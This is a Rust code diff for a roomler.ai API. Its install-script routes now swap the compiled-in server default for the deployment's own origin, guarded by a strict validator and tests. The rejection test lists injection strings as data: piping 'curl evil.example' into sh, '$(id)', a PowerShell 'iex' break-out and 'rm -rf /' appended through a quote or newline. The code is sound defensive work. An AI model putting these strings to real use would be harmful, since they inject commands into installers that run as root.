@@ -25,7 +25,7 @@ use axum::{
     response::Response,
 };
 use serde::{Deserialize, Serialize};
-use std::time::Duration;
+use std::{borrow::Cow, time::Duration};
 
 use crate::{
     error::ApiError,
@@ -170,23 +170,132 @@ pub fn pick_setup_asset<'a>(
 const INSTALL_SH: &str = include_str!("../../../../scripts/install.sh");
 const INSTALL_PS1: &str = include_str!("../../../../scripts/install.ps1");
 
-fn script_response(body: &'static str, content_type: &'static str) -> Response {
+/// FR-50 — the exact text of each script's server default, held here so the
+/// route can substitute the server that is actually serving the script.
+///
+/// A piped installer cannot see the URL it was fetched from: `curl … | sh` has
+/// no `$0`, no filename and no referrer. So without this a self-hosted
+/// deployment hands out a script that downloads the agent from the self-hosted
+/// server (that part is parameterised and works) and then enrols it against
+/// `roomler.ai` — which rejects a token only the self-hosted server can verify,
+/// with an error that names the token rather than the server.
+///
+/// ⚠️ Asserted to appear EXACTLY ONCE in each embedded script by
+/// `the_server_default_is_substitutable_exactly_once`. A blind `replace` on a
+/// shell script is a silent-failure machine: edit the line and the server keeps
+/// serving the old default with nothing failing anywhere. The test is what
+/// makes that a build error instead.
+const SERVER_NEEDLE_SH: &str = "SERVER=\"https://roomler.ai\"";
+const SERVER_NEEDLE_PS1: &str = "[string]$Server = 'https://roomler.ai',";
+
+/// The origin to substitute, or `None` to serve the script unchanged.
+///
+/// ⚠️ The result is spliced into a shell double-quoted string and a PowerShell
+/// single-quoted string, inside a script that then runs as **root / SYSTEM**. A
+/// value carrying `"`, `$`, a backtick, a quote or a newline would be command
+/// injection into an installer, authored by whoever can set an env var on the
+/// API process. So this is a narrow POSITIVE match — scheme, host, optional
+/// port, optional trailing slash, nothing else — and anything outside it is
+/// refused rather than escaped.
+///
+/// Refusing is always safe: serving the compiled-in default is exactly the
+/// behaviour every deployment had before this existed.
+fn substitutable_origin(frontend_url: &str) -> Option<String> {
+    let raw = frontend_url.trim();
+    let scheme = if raw.starts_with("https://") {
+        "https"
+    } else if raw.starts_with("http://") {
+        "http"
+    } else {
+        return None;
+    };
+    let rest = &raw[scheme.len() + 3..];
+    // One optional trailing slash is idiomatic in config and harmless. A real
+    // PATH is not: the installer appends its own (`$SERVER/api/agent/...`).
+    let hostport = rest.strip_suffix('/').unwrap_or(rest);
+    if hostport.is_empty() || hostport.len() > 253 {
+        return None;
+    }
+    let (host, port) = match hostport.rsplit_once(':') {
+        Some((h, p)) => (h, Some(p)),
+        None => (hostport, None),
+    };
+    if host.is_empty()
+        || !host
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'-' || b == b'_')
+    {
+        return None;
+    }
+    if let Some(p) = port {
+        if p.is_empty() || p.len() > 5 || !p.bytes().all(|b| b.is_ascii_digit()) {
+            return None;
+        }
+    }
+    Some(format!("{scheme}://{hostport}"))
+}
+
+/// Substitute `needle`'s embedded default for this deployment's own origin, or
+/// hand back the script untouched when the origin is unusable or identical.
+///
+/// Borrows in the identical case on purpose: the hosted service's
+/// `frontend_url` IS `https://roomler.ai`, so the overwhelmingly common path
+/// allocates nothing and serves byte-identical bytes.
+fn with_server_default<'a>(
+    script: &'a str,
+    needle: &str,
+    render: impl Fn(&str) -> String,
+    frontend_url: &str,
+) -> Cow<'a, str> {
+    let Some(origin) = substitutable_origin(frontend_url) else {
+        tracing::warn!(
+            frontend_url,
+            "install script: app.frontend_url is not a plain scheme://host[:port], \
+             serving the compiled-in server default unchanged — a device installed \
+             from this server will enrol against roomler.ai unless --server is passed"
+        );
+        return Cow::Borrowed(script);
+    };
+    let replacement = render(&origin);
+    if replacement == needle {
+        return Cow::Borrowed(script);
+    }
+    Cow::Owned(script.replacen(needle, &replacement, 1))
+}
+
+fn script_response(body: Cow<'static, str>, content_type: &'static str) -> Response {
+    let bytes = body.into_owned();
     Response::builder()
         .status(StatusCode::OK)
         .header("Content-Type", content_type)
+        // Still cacheable: the body varies per SERVER, not per request, so a
+        // cache in front of one deployment only ever holds that deployment's
+        // script. No `Vary` — nothing here reads a request header.
         .header("Cache-Control", "public, max-age=300")
-        .body(Body::from(body))
-        .unwrap_or_else(|_| Response::new(Body::from(body)))
+        .body(Body::from(bytes.clone()))
+        .unwrap_or_else(|_| Response::new(Body::from(bytes)))
 }
 
 /// `GET /api/setup/install.sh` — the Linux/macOS terminal installer.
-pub async fn install_script_sh() -> Response {
-    script_response(INSTALL_SH, "text/x-shellscript; charset=utf-8")
+pub async fn install_script_sh(State(state): State<AppState>) -> Response {
+    let body = with_server_default(
+        INSTALL_SH,
+        SERVER_NEEDLE_SH,
+        |o| format!("SERVER=\"{o}\""),
+        &state.settings.app.frontend_url,
+    );
+    script_response(body, "text/x-shellscript; charset=utf-8")
 }
 
 /// `GET /api/setup/install.ps1` — the Windows terminal installer.
-pub async fn install_script_ps1() -> Response {
-    script_response(INSTALL_PS1, "text/plain; charset=utf-8")
+pub async fn install_script_ps1(State(state): State<AppState>) -> Response {
+    let body = with_server_default(
+        INSTALL_PS1,
+        SERVER_NEEDLE_PS1,
+        |o| format!("[string]$Server = '{o}',"),
+        &state.settings.app.frontend_url,
+    );
+    script_response(body, "text/plain; charset=utf-8")
 }
 
 /// Stream a release asset's bytes through the proxy with download
@@ -420,6 +529,147 @@ mod tests {
         // start with "eyJ" — the {"typ"/{"alg" header).
         assert!(!INSTALL_SH.contains("eyJ"));
         assert!(!INSTALL_PS1.contains("eyJ"));
+    }
+
+    // ─── FR-50: the served script names the server that served it ──────────
+
+    /// The lock that makes the substitution non-silent. Without it, editing
+    /// either script's `SERVER=` line disables the rewrite and nothing fails —
+    /// self-hosted installs quietly go back to enrolling against roomler.ai.
+    #[test]
+    fn the_server_default_is_substitutable_exactly_once() {
+        assert_eq!(
+            INSTALL_SH.matches(SERVER_NEEDLE_SH).count(),
+            1,
+            "install.sh must contain exactly one `{SERVER_NEEDLE_SH}` — if you \
+             edited that line, update SERVER_NEEDLE_SH in the same commit"
+        );
+        assert_eq!(
+            INSTALL_PS1.matches(SERVER_NEEDLE_PS1).count(),
+            1,
+            "install.ps1 must contain exactly one `{SERVER_NEEDLE_PS1}` — if you \
+             edited that line, update SERVER_NEEDLE_PS1 in the same commit"
+        );
+    }
+
+    #[test]
+    fn substitutable_origin_accepts_a_plain_scheme_host_port() {
+        for (input, want) in [
+            ("https://roomler.ai", "https://roomler.ai"),
+            ("https://roomler.ai/", "https://roomler.ai"),
+            ("http://localhost:8080", "http://localhost:8080"),
+            ("http://localhost:8080/", "http://localhost:8080"),
+            (
+                "https://my-roomler.example.com:8443",
+                "https://my-roomler.example.com:8443",
+            ),
+            ("  https://roomler.ai  ", "https://roomler.ai"),
+        ] {
+            assert_eq!(
+                substitutable_origin(input).as_deref(),
+                Some(want),
+                "{input} should substitute as {want}"
+            );
+        }
+    }
+
+    /// The security half. This value is spliced into a script that runs as
+    /// root/SYSTEM, so anything that is not plainly a scheme://host[:port] is
+    /// REFUSED rather than escaped — a refusal serves the compiled-in default,
+    /// which is exactly the behaviour before this existed.
+    #[test]
+    fn substitutable_origin_refuses_anything_that_could_be_injected() {
+        for input in [
+            // shell metacharacters, straight into a double-quoted string
+            "https://roomler.ai\"; curl evil.example | sh; #",
+            "https://roomler.ai$(id)",
+            "https://roomler.ai`id`",
+            "https://roomler.ai${IFS}",
+            // PowerShell single-quote break-out
+            "https://roomler.ai'; iex 'x",
+            // newline — would append whole statements to the script
+            "https://roomler.ai\nrm -rf /",
+            // a path: the installer appends its own, so this is wrong even
+            // when it is harmless
+            "https://roomler.ai/base",
+            "https://roomler.ai/api/",
+            // userinfo, query, fragment
+            "https://user:pw@roomler.ai",
+            "https://roomler.ai?x=1",
+            "https://roomler.ai#f",
+            // wrong or missing scheme
+            "ftp://roomler.ai",
+            "roomler.ai",
+            "//roomler.ai",
+            "",
+            "   ",
+            "https://",
+            "https:///",
+            // malformed port
+            "https://roomler.ai:",
+            "https://roomler.ai:80a",
+            "https://roomler.ai:123456",
+        ] {
+            assert_eq!(
+                substitutable_origin(input),
+                None,
+                "{input:?} must be refused, not substituted"
+            );
+        }
+    }
+
+    #[test]
+    fn a_self_hosted_origin_is_substituted_into_both_scripts() {
+        let sh = with_server_default(
+            INSTALL_SH,
+            SERVER_NEEDLE_SH,
+            |o| format!("SERVER=\"{o}\""),
+            "http://localhost:8080",
+        );
+        assert!(sh.contains("SERVER=\"http://localhost:8080\""));
+        assert!(
+            !sh.contains(SERVER_NEEDLE_SH),
+            "the roomler.ai default must be gone, not merely joined"
+        );
+
+        let ps1 = with_server_default(
+            INSTALL_PS1,
+            SERVER_NEEDLE_PS1,
+            |o| format!("[string]$Server = '{o}',"),
+            "http://localhost:8080",
+        );
+        assert!(ps1.contains("[string]$Server = 'http://localhost:8080',"));
+        assert!(!ps1.contains(SERVER_NEEDLE_PS1));
+    }
+
+    /// The hosted service's own case, and the reason this ships without a
+    /// staged rollout: prod's `frontend_url` IS `https://roomler.ai`, so the
+    /// bytes it serves do not change at all.
+    #[test]
+    fn the_hosted_origin_serves_the_script_byte_identical() {
+        let sh = with_server_default(
+            INSTALL_SH,
+            SERVER_NEEDLE_SH,
+            |o| format!("SERVER=\"{o}\""),
+            "https://roomler.ai",
+        );
+        assert_eq!(sh.as_ref(), INSTALL_SH);
+        assert!(matches!(sh, Cow::Borrowed(_)), "identical ⇒ no allocation");
+    }
+
+    /// A refused origin must leave the script alone rather than, say, blank
+    /// the default — a broken installer is worse than one pointing at the
+    /// wrong server, because the operator has nothing to override.
+    #[test]
+    fn a_refused_origin_serves_the_compiled_in_default() {
+        let sh = with_server_default(
+            INSTALL_SH,
+            SERVER_NEEDLE_SH,
+            |o| format!("SERVER=\"{o}\""),
+            "https://roomler.ai\"; rm -rf /; #",
+        );
+        assert_eq!(sh.as_ref(), INSTALL_SH);
+        assert!(sh.contains(SERVER_NEEDLE_SH));
     }
 
     #[test]
